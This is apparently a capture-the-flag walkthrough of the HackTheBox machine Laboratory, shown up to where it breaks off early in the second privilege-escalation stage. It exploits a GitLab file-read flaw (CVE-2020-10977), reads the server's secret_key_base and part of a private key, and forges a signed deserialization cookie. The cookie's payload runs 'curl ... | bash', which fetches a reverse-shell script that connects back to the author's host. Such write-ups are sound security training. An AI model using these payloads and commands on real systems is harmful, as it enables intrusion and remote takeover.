---
title: HTB: Laboratory
url: https://0xdf.gitlab.io/2021/04/17/htb-laboratory.html
date: 2021-04-17T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: hackthebox, htb-laboratory, ctf, gitlab, nmap, vhosts, gobuster, searchsploit, cve-2020-10977, deserialization, hackerone, docker, ruby, irb, suid, path-hijack
---

![Laboratory](https://0xdfimages.gitlab.io/img/laboratory-cover.png)

As the name hints at, Laboratory is largely about exploiting a GitLab instance. I’ll exploit a CVE to get arbitrary read and then code execution in the GitLab container. From there, I’ll use that access to get access to the admin’s private repo, which happens to have an SSH key. To escalate to root, I’ll exploit a SUID binary that is calling `system("chmod ...")` in an unsafe way, dropping my own binary and modifying the PATH so that mine gets run as root.

## Box Info

| Name | [Laboratory](https://hackthebox.com/machines/laboratory)  [Laboratory](https://hackthebox.com/machines/laboratory) [Play on HackTheBox](https://hackthebox.com/machines/laboratory) |
| --- | --- |
| Release Date | [14 Nov 2020](https://twitter.com/hackthebox_eu/status/1382706316012032004) |
| Retire Date | 17 Apr 2021 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Laboratory |
| Radar Graph | Radar chart for Laboratory |
| First Blood User | 01:48:28[wtflink wtflink](https://app.hackthebox.com/users/8932) |
| First Blood Root | 02:03:10[Icebreaker Icebreaker](https://app.hackthebox.com/users/10744) |
| Creator | [0xc45 0xc45](https://app.hackthebox.com/users/73268) |

## Recon

### nmap

`nmap` found three open TCP ports, SSH (22), HTTP (80), and HTTPS (443):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.216
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-02 15:07 EST
Nmap scan report for 10.10.10.216
Host is up (0.017s latency).
Not shown: 65532 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 13.43 seconds

oxdf@parrot$ nmap -p 22,80,443 -sCV -oA scans/nmap-tcpscripts 10.10.10.216
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-02 15:08 EST
Nmap scan report for 10.10.10.216
Host is up (0.014s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1
Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.88 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 Focal. `nmap` shows the TLS certificate has the name `laboratory.htb`, as well as `git.labority.htb`. The HTTP server shows a redirect to HTTPS `laboratory.htb` as well.

### VHost Fuzz

I did a quick `wfuzz` to look for other subdomains, but only found `git`:

```

oxdf@parrot$ wfuzz -u https://10.10.10.216 -H "Host: FUZZ.laboratory.htb" -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 7254
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.10.216/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000110:   302        0 L      5 W        105 Ch      "git"
000037212:   400        12 L     53 W       428 Ch      "*"                                                                                                  

Total time: 0
Processed Requests: 100000
Filtered Requests: 99998
Requests/sec.: 0

```

I’ll add those two to my `/etc/hosts` file:

```
10.10.10.216 laboratory.htb git.laboratory.htb

```

### Website - TCP 80

Visiting the site over HTTP by either IP or hostname just return a 302 redirect to the HTTPS site

```

HTTP/1.1 302 Found
Date: Tue, 02 Mar 2021 22:50:32 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: https://laboratory.htb/
Content-Length: 285
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="https://laboratory.htb/">here</a>.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.10.10.216 Port 80</address>
</body></html>

```

### laboratory.htb - TCP 443

#### Site

The site is a page for a company in Infosec services:

[![image-20210302175131135](https://0xdfimages.gitlab.io/img/image-20210302175131135.png)](https://0xdfimages.gitlab.io/img/image-20210302175131135.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210302175131135.png)

#### Tech Stack

The main page is `index.html`, which doesn’t reveal much about the site. Similarly, the response headers just show Apache. I’m inclined to think there could be some PHP, or that it’s a static site.

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x php` since I suspect the site could be PHP:

```

oxdf@parrot$ gobuster dir -k -u https://laboratory.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 20 -o scans/gobuster-laboritory.htb-root-small-php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://laboratory.htb
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/03/05 16:24:31 Starting gobuster
===============================================================
/images (Status: 301)
/assets (Status: 301)
===============================================================
2021/03/05 16:29:34 Finished
===============================================================

```

Nothing there unexpected or interesting.

### git.laboratory.htb - TCP 443

#### Site

The site is an instance of GitLab:

![image-20210305162633825](https://0xdfimages.gitlab.io/img/image-20210305162633825.png)

I don’t have creds, but I can register. I tried, but at first it returned an error:

![image-20210305162735241](https://0xdfimages.gitlab.io/img/image-20210305162735241.png)

Changing the emails to `0xdf@laboratory.htb` fixes that.

Under Projects -> Explore projects I find a single project that I can access, “Secure Website”:

![image-20210305162934244](https://0xdfimages.gitlab.io/img/image-20210305162934244.png)

It’s the code for the website running on `laboratory.htb`, and it looks very much like a static site:

![image-20210305163008746](https://0xdfimages.gitlab.io/img/image-20210305163008746.png)

The project is not set up to run pipelines, so I’m out of luck there:

![image-20210305163113374](https://0xdfimages.gitlab.io/img/image-20210305163113374.png)

The owner of the project is Dexter McPherson, and it looks like his account name is just dexter:

![image-20210307052624168](https://0xdfimages.gitlab.io/img/image-20210307052624168.png)

The help page gives the GitLab version:

![image-20210305163216941](https://0xdfimages.gitlab.io/img/image-20210305163216941.png)

#### Exploits

`searchsploit` identifies a arbitrary file read vulnerability in GitLab 12.9.0, which is newer than 12.8.1, so it might apply here as well:

```

oxdf@parrot$ searchsploit gitlab 12
--------------------------------------- ---------------------------------
 Exploit Title                         |  Path
--------------------------------------- ---------------------------------
GitLab 11.4.7 - RCE (Authenticated)    | ruby/webapps/49334.py
Gitlab 11.4.7 - Remote Code Execution  | ruby/webapps/49257.py
GitLab 11.4.7 - Remote Code Execution  | ruby/webapps/49263.py
GitLab 12.9.0 - Arbitrary File Read    | ruby/webapps/48431.txt
Gitlab 12.9.0 - Arbitrary File Read (A | ruby/webapps/49076.py
Gitlab 6.0 - Persistent Cross-Site Scr | php/webapps/30329.sh
--------------------------------------- ---------------------------------
Shellcodes: No Results

```

I couldn’t get either of the Python scripts there to work, but it was enough to send me Googling, where I learned a good bit more about the vulnerability.

## Shell as git

### File Read

#### Manually

To exploit this vulnerability (CVE-2020-10977), I’ll need to create two projects:

![image-20210305164527052](https://0xdfimages.gitlab.io/img/image-20210305164527052.png)

Then go into `proj1` and create an issue with markdown language image reference where the image is a directory traversal payload pointing to the file I want:

![image-20210305165440196](https://0xdfimages.gitlab.io/img/image-20210305165440196.png)

After submitting that, expand the menu on the right side, and at the bottom of it I’ll find “Move issue”, where I can select `proj2`:

![image-20210305164924810](https://0xdfimages.gitlab.io/img/image-20210305164924810.png)

In the new issue, there’s a file linked at the top just under the issue name:

![image-20210305165531059](https://0xdfimages.gitlab.io/img/image-20210305165531059.png)

Clicking on it will download a copy:

```

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...[snip]...
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh

```

#### Script

In searching for information about this exploit, I found [this repo](https://github.com/thewhiteh4t/cve-2020-10977). The script is pretty slick:

```

oxdf@parrot$ python cve_2020_10977.py https://git.laboratory.htb 0xdf 0xdf0xdf
----------------------------------
--- CVE-2020-10977 ---------------
--- GitLab Arbitrary File Read ---
--- 12.9.0 & Below ---------------
----------------------------------

[>] Found By : vakzz       [ https://hackerone.com/reports/827052 ]
[>] PoC By   : thewhiteh4t [ https://twitter.com/thewhiteh4t      ]

[+] Target        : https://git.laboratory.htb
[+] Username      : 0xdf
[+] Password      : 0xdf0xdf
[+] Project Names : ProjectOne, ProjectTwo

[!] Trying to Login...
[+] Login Successful!
[!] Creating ProjectOne...
[+] ProjectOne Created Successfully!
[!] Creating ProjectTwo...
[+] ProjectTwo Created Successfully!
[>] Absolute Path to File : /etc/lsb-release
[!] Creating an Issue...
[+] Issue Created Successfully!
[!] Moving Issue...
[+] Issue Moved Successfully!
[+] File URL : https://git.laboratory.htb/0xdf/ProjectTwo/uploads/4a8e600fea969e736ffa05fa84f1d14d/lsb-release

[>] Absolute Path to File :

```

Now I’ll enter a filename, and it works:

```

[>] Absolute Path to File : /etc/lsb-release
----------------------------------------

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.6 LTS"
----------------------------------------

```

On exiting, it cleans up as well:

```

[>] Absolute Path to File : ^C
[-] Keyboard Interrupt
[!] Deleting ProjectOne...
[+] ProjectOne Successfully Deleted!
[!] Deleting ProjectTwo...
[+] ProjectTwo Successfully Deleted!

```

### RCE

#### Enumeration

In the script above, there’s a link to a [HackerOne report](https://hackerone.com/reports/827052), and while the report starts off as arbitrary read, the researcher finds how to convert that to code execution. I’ll start by reading `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml`:

```

# This file is managed by gitlab-ctl. Manual changes will be        
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb  
# and run `sudo gitlab-ctl reconfigure`.                                            
---                                                                                 
production:                                                                         
  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0b84263903fd06af
  openid_connect_signing_key: |                                                     
    -----BEGIN RSA PRIVATE KEY-----                                                 
    MIIJKQIBAAKCAgEA5LQnENotwu/SUAshZ9vacrnVeYXrYPJoxkaRc2Q3JpbRcZTu
    YxMJm2+5ZDzaDu5T4xLbcM0BshgOM8N3gMcogz0KUmMD3OGLt90vNBq8Wo/9cSyV
    RnBSnbCl0EzpFeeMBymR8aBm8sRpy7+n9VRawmjX9os25CmBBJB93NnZj8QFJxPt
...[snip]...

```

For the exploit to work, my payload will need to be created in an environment with the same `secret_key_base`.

#### Docker

I need a copy of this version of GitLab to build the deserialization payload. The easiest way to do that is using Docker. I’ll install with `sudo apt install docker.io`. I’ll need to add myself to the docker group as well (`sudo usermod -a -G docker oxdf` and log out and back in). Now I can get and run the image with `docker run gitlab/gitlab-ce:12.8.1-ce.0`. For this image to work properly, it’s better to let it start on it’s own like this (rather than having it run `bash` to get a shell) so that the various GitLab components can start.

After a minute, once the container has started, in another terminal I’ll run `docker ps` to get the name of the container, and then `docker exec` to get a shell in it:

```

oxdf@parrot$ docker ps
CONTAINER ID   IMAGE                          COMMAND             CREATED        STATUS                  PORTS                     NAMES
d80815a5b502   gitlab/gitlab-ce:12.8.1-ce.0   "/assets/wrapper"   13 hours ago   Up 13 hours (healthy)   22/tcp, 80/tcp, 443/tcp   cranky_shamir
oxdf@parrot$ docker exec -it cranky_shamir bash
root@d80815a5b502:/#

```

To update the `secret_key_base`, I’ll add it to `/etc/gitlab/gitlab/rb` inside the container:

```

root@d80815a5b502:/# echo "gitlab_rails['secret_key_base']='3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8e
bb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3'" >> /etc/gitlab/gitlab.rb 
root@d80815a5b502:/# gitlab-ctl reconfigure
Starting Chef Client, version 14.14.29
resolving cookbooks for run list: ["gitlab"]
Synchronizing Cookbooks:
  - gitlab (0.0.1)  
  - postgresql (0.1.0)
...[snip]...
    * ruby_block[wait for grafana service socket] action run (skipped due to not_if)
     (up to date)

Running handlers:
Running handlers complete
Chef Client finished, 2/687 resources updated in 07 seconds
gitlab Reconfigured!

```

I’ll start the `irb` console, and note that the `secret_key_base` variable is updated to match the one from Laboratory:

```

root@d80815a5b502:/# gitlab-rails console
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)
irb(main):001:0> Rails.application.env_config["action_dispatch.secret_key_base"]
=> "3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3"

```

This is the key that is used to sign serialized objects so that a user can’t tamper with them. Because I have it, I can now generate my own serialized payload and the server will trust it and deserialize it, which is a path to code execution.

I’ll build a payload using the steps from the [HackerOne report](https://hackerone.com/reports/827052):

```

irb(main):002:0> request = ActionDispatch::Request.new(Rails.application.env_config)
=> #<ActionDispatch::Request:0x00007f0e7ecc92f8 @env={"action_dispatch.parameter_filter"=>[/token$/, /password/, /secret/, /key$/, /^body$/, /^description$/, /^note$/, /^text$/, /^title$/, :certificate, :encrypted_key, :hook, :import_url, :otp_attempt, :sentry_dsn, :trace, :variables, :content, :sharedSecret, /^((?-mix:client_secret|code|authentication_token|access_token|refresh_token))$/], "action_dispatch.redirect_filter"=>[], "action_dispatch.secret_key_base"=>"3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3", "action_dispatch.show_exceptions"=>true, "action_dispatch.show_detailed_exceptions"=>false, "action_dispatch.logger"=>#<ActiveSupport::Logger:0x00007f0e843f29f8 @level=1, @progname=nil, @default_formatter=#<Logger::Formatter:0x00007f0e84342300 @datetime_format=nil>, @formatter=#<ActiveSupport::Logger::SimpleFormatter:0x00007f0e843f29d0 @datetime_format=nil, @thread_key="activesupport_tagged_logging_tags:69850162500840">, @logdev=#<Logger::LogDevice:0x00007f0e843422b0 @shift_period_suffix=nil, @shift_size=nil, @shift_age=nil, @filename=nil, @dev=#<File:/opt/gitlab/embedded/service/gitlab-rails/log/production.log>, @mon_mutex=#<Thread::Mutex:0x00007f0e84342238>, @mon_mutex_owner_object_id=69850162139480, @mon_owner=nil, @mon_count=0>>, "action_dispatch.backtrace_cleaner"=>#<Rails::BacktraceCleaner:0x00007f0e8f9a0548 @silencers=[#<Proc:0x00007f0e8bff90b0@/opt/gitlab/embedded/service/gitlab-rails/config/initializers/backtrace_silencers.rb:8>], @filters=[#<Proc:0x00007f0e8f9b5d58@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/activesupport-6.0.2/lib/active_support/backtrace_cleaner.rb:97>, #<Proc:0x00007f0e8f9b5880@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/railties-6.0.2/lib/rails/backtrace_cleaner.rb:16>, #<Proc:0x00007f0e8f9b56c8@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/railties-6.0.2/lib/rails/backtrace_cleaner.rb:17>, #<Proc:0x00007f0e8f9b5650@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/railties-6.0.2/lib/rails/backtrace_cleaner.rb:18>], @root="/opt/gitlab/embedded/service/gitlab-rails/">, "action_dispatch.key_generator"=>#<ActiveSupport::CachingKeyGenerator:0x00007f0e7fddebd8 @key_generator=#<ActiveSupport::KeyGenerator:0x00007f0e7fddec00 @secret="3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3", @iterations=1000>, @cache_keys=#<Concurrent::Map:0x00007f0e7fddebb0 entries=1 default_proc=nil>>, "action_dispatch.http_auth_salt"=>"http authentication", "action_dispatch.signed_cookie_salt"=>"signed cookie", "action_dispatch.encrypted_cookie_salt"=>"encrypted cookie", "action_dispatch.encrypted_signed_cookie_salt"=>"signed encrypted cookie", "action_dispatch.authenticated_encrypted_cookie_salt"=>"authenticated encrypted cookie", "action_dispatch.use_authenticated_cookie_encryption"=>false, "action_dispatch.encrypted_cookie_cipher"=>nil, "action_dispatch.signed_cookie_digest"=>nil, "action_dispatch.cookies_serializer"=>:hybrid, "action_dispatch.cookies_digest"=>nil, "action_dispatch.cookies_rotations"=>#<ActiveSupport::Messages::RotationConfiguration:0x00007f0e98bedf18 @signed=[], @encrypted=[]>, "action_dispatch.use_cookies_with_metadata"=>false, "action_dispatch.content_security_policy"=>nil, "action_dispatch.content_security_policy_report_only"=>false, "action_dispatch.content_security_policy_nonce_generator"=>nil, "action_dispatch.content_security_policy_nonce_directives"=>nil}, @filtered_parameters=nil, @filtered_env=nil, @filtered_path=nil, @protocol=nil, @port=nil, @method=nil, @request_method=nil, @remote_ip=nil, @original_fullpath=nil, @fullpath=nil, @ip=nil>
irb(main):003:0> request.env["action_dispatch.cookies_serializer"] = :marshal
=> :marshal
irb(main):004:0> cookies = request.cookie_jar
=> #<ActionDispatch::Cookies::CookieJar:0x00007f0e7fafdb80 @set_cookies={}, @delete_cookies={}, @request=#<ActionDispatch::Request:0x00007f0e7ecc92f8 @env={"action_dispatch.parameter_filter"=>[/token$/, /password/, /secret/, /key$/, /^body$/, /^description$/, /^note$/, /^text$/, /^title$/, :certificate, :encrypted_key, :hook, :import_url, :otp_attempt, :sentry_dsn, :trace, :variables, :content, :sharedSecret, /^((?-mix:client_secret|code|authentication_token|access_token|refresh_token))$/], "action_dispatch.redirect_filter"=>[], "action_dispatch.secret_key_base"=>"3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3", "action_dispatch.show_exceptions"=>true, "action_dispatch.show_detailed_exceptions"=>false, "action_dispatch.logger"=>#<ActiveSupport::Logger:0x00007f0e843f29f8 @level=1, @progname=nil, @default_formatter=#<Logger::Formatter:0x00007f0e84342300 @datetime_format=nil>, @formatter=#<ActiveSupport::Logger::SimpleFormatter:0x00007f0e843f29d0 @datetime_format=nil, @thread_key="activesupport_tagged_logging_tags:69850162500840">, @logdev=#<Logger::LogDevice:0x00007f0e843422b0 @shift_period_suffix=nil, @shift_size=nil, @shift_age=nil, @filename=nil, @dev=#<File:/opt/gitlab/embedded/service/gitlab-rails/log/production.log>, @mon_mutex=#<Thread::Mutex:0x00007f0e84342238>, @mon_mutex_owner_object_id=69850162139480, @mon_owner=nil, @mon_count=0>>, "action_dispatch.backtrace_cleaner"=>#<Rails::BacktraceCleaner:0x00007f0e8f9a0548 @silencers=[#<Proc:0x00007f0e8bff90b0@/opt/gitlab/embedded/service/gitlab-rails/config/initializers/backtrace_silencers.rb:8>], @filters=[#<Proc:0x00007f0e8f9b5d58@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/activesupport-6.0.2/lib/active_support/backtrace_cleaner.rb:97>, #<Proc:0x00007f0e8f9b5880@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/railties-6.0.2/lib/rails/backtrace_cleaner.rb:16>, #<Proc:0x00007f0e8f9b56c8@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/railties-6.0.2/lib/rails/backtrace_cleaner.rb:17>, #<Proc:0x00007f0e8f9b5650@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/railties-6.0.2/lib/rails/backtrace_cleaner.rb:18>], @root="/opt/gitlab/embedded/service/gitlab-rails/">, "action_dispatch.key_generator"=>#<ActiveSupport::CachingKeyGenerator:0x00007f0e7fddebd8 @key_generator=#<ActiveSupport::KeyGenerator:0x00007f0e7fddec00 @secret="3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3", @iterations=1000>, @cache_keys=#<Concurrent::Map:0x00007f0e7fddebb0 entries=1 default_proc=nil>>, "action_dispatch.http_auth_salt"=>"http authentication", "action_dispatch.signed_cookie_salt"=>"signed cookie", "action_dispatch.encrypted_cookie_salt"=>"encrypted cookie", "action_dispatch.encrypted_signed_cookie_salt"=>"signed encrypted cookie", "action_dispatch.authenticated_encrypted_cookie_salt"=>"authenticated encrypted cookie", "action_dispatch.use_authenticated_cookie_encryption"=>false, "action_dispatch.encrypted_cookie_cipher"=>nil, "action_dispatch.signed_cookie_digest"=>nil, "action_dispatch.cookies_serializer"=>:marshal, "action_dispatch.cookies_digest"=>nil, "action_dispatch.cookies_rotations"=>#<ActiveSupport::Messages::RotationConfiguration:0x00007f0e98bedf18 @signed=[], @encrypted=[]>, "action_dispatch.use_cookies_with_metadata"=>false, "action_dispatch.content_security_policy"=>nil, "action_dispatch.content_security_policy_report_only"=>false, "action_dispatch.content_security_policy_nonce_generator"=>nil, "action_dispatch.content_security_policy_nonce_directives"=>nil, "rack.request.cookie_hash"=>{}, "action_dispatch.cookies"=>#<ActionDispatch::Cookies::CookieJar:0x00007f0e7fafdb80 ...>}, @filtered_parameters=nil, @filtered_env=nil, @filtered_path=nil, @protocol=nil, @port=nil, @method=nil, @request_method=nil, @remote_ip=nil, @original_fullpath=nil, @fullpath=nil, @ip=nil>, @cookies={}, @committed=false>

```

At this point it’s time to set the payload. I’ll use a simple curl to myself piping the results into `sh`:

```

irb(main):005:0> erb = ERB.new("<%= `curl 10.10.14.8/sh | bash` %>")
=> #<ERB:0x00007f0e7b4f89f0 @safe_level=nil, @src="#coding:UTF-8\n_erbout = +''; _erbout.<<(( `curl 10.10.14.8/sh | bash` ).to_s); _erbout", @encoding=#<Encoding:UTF-8>, @frozen_string=nil, @filename=nil, @lineno=0>

```

Interestingly, the next two steps each run the payload. In this case, as I haven’t started a webserver on my host, it fails to connect all three times:

```

irb(main):006:0> depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to 10.10.14.8 port 80: Connection refused
=> ""
irb(main):007:0> cookies.signed[:cookie] = depr
DEPRECATION WARNING: @result is deprecated! Call result.is_a? instead of @result.is_a?. Args: [Hash] (called from irb_binding at (irb):7)
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to 10.10.14.8 port 80: Connection refused
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to 10.10.14.8 port 80: Connection refused
=> ""

```

Now print the payload:

```

irb(main):008:0> puts cookies[:cookie]
BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiWyNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBjdXJsIDEwLjEwLjE0Ljgvc2ggfCBiYXNoYCApLnRvX3MpOyBfZXJib3V0BjoGRUY6DkBlbmNvZGluZ0l1Og1FbmNvZGluZwpVVEYtOAY7CkY6E0Bmcm96ZW5fc3RyaW5nMDoOQGZpbGVuYW1lMDoMQGxpbmVub2kAOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsKVDoQQGRlcHJlY2F0b3JJdTofQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb24ABjsKVA==--05460c0d9545ac9d886594b7251a19811d91d6be
=> nil

```

#### Send Payload

I’ll start a Python webserver, and use `curl` to send the payload. I need `-k` to ignore the invalid certificate:

```

oxdf@parrot$ curl -k https://git.laboratory.htb/users/sign_in --cookie "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiWyNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBjdXJsIDEwLjEwLjE0Ljgvc2ggfCBiYXNoYCApLnRvX3MpOyBfZXJib3V0BjoGRUY6DkBlbmNvZGluZ0l1Og1FbmNvZGluZwpVVEYtOAY7CkY6E0Bmcm96ZW5fc3RyaW5nMDoOQGZpbGVuYW1lMDoMQGxpbmVub2kAOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsKVDoQQGRlcHJlY2F0b3JJdTofQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb24ABjsKVA==--05460c0d9545ac9d886594b7251a19811d91d6be"
...[snip]...

```

Immediately at the webserver, there’s a request from Laboratory:

```

oxdf@parrot$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.216 - - [07/Mar/2021 04:55:55] code 404, message File not found
10.10.10.216 - - [07/Mar/2021 04:55:55] "GET /sh HTTP/1.1" 404 -

```

I’ll write a simple payload and save it as `sh` in the hosted directory:

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.8/443 0>&1

```

On re-running the same `curl` command, the hit on the webserver is successful this time:

```
10.10.10.216 - - [07/Mar/2021 04:56:49] "GET /sh HTTP/1.1" 200 -

```

And there’s a shell at `nc`:

```

oxdf@parrot$ sudo nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.216] 54360
bash: cannot set terminal process group (414): Inappropriate ioctl for device
bash: no job control in this shell
git@git:~/gitlab-rails/working$ id
uid=998(git) gid=998(git) groups=998(git)

```

I’ll upgrade the shell:

```

git@git:~/gitlab-rails/working$ python3 -c 'import pty;pty.spawn("bash")'
git@git:~/gitlab-rails/working$ ^Z
[1]+  Stopped                 sudo nc -lnvp 443
oxdf@parrot$ stty raw -echo ; fg
sudo nc -lnvp 443
                 reset
reset: unknown terminal type unknown
Terminal type? screen
                                                                         
git@git:~/gitlab-rails/working$

```

## Shell as dexter

### Enumeration

#### Container

It becomes clear very quickly that there’s not much here except for GitLab, and I’m in a Docker container:
- There’s no users in `/home`.
- Common binaries like `ip`, `ifconfig`, and `netstat` are not installed.
- There’s a `/.dockerenv` file.

I can pull the local IP address from `/proc/net/fib_trie`:

```

git@git:/$ cat /proc/net/fib_trie
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
...[snip]...
     +-- 172.17.0.0/16 2 0 2
        +-- 172.17.0.0/30 2 0 2
           |-- 172.17.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.17.0.2
              /32 host LOCAL
        |-- 172.17.255.255
           /32 link BROADCAST
...[snip]...

```

#### GitLab

I didn’t find much in the way to escalate to root in this container, so I started looking at GitLab itself. I can’t access the `/etc/gitlab/gitlab.rb` file where much of the configuration information is stored:

```

git@git:/$ ls -l /etc/gitlab/gitlab.rb
